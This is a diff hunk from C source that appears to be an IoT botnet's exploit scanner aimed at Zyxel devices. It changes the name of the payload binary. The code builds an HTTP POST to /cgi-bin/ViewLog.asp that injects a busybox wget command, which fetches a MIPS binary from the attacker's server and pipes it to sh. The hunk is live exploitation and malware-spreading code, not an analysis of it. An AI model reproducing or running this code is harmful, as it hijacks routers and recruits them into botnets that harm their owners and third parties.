@@ -194,7 +194,7 @@ void zyxel_scanner_init(void)
 				if (conn->state == ZYXEL_SC_EXPLOIT_STAGE2) {
 					struct in_addr ia; ia.s_addr = SERVIP;
 					char body[256];
-					int blen = snprintf(body, sizeof(body), " /bin/busybox wget http://%s/bins/nullpointer.mips -O - | sh", inet_ntoa(ia));
+					int blen = snprintf(body, sizeof(body), " /bin/busybox wget http://%s/bins/fnbnet.mips -O - | sh", inet_ntoa(ia));
 					snprintf(conn->payload_buf, sizeof(conn->payload_buf),
 						"POST /cgi-bin/ViewLog.asp HTTP/1.1\r\nHost: 192.168.0.1:8080\r\nConnection: keep-alive\r\nAccept: */*\r\nUser-Agent: python-requests/2.20.0\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n%s",
 						blen, body);
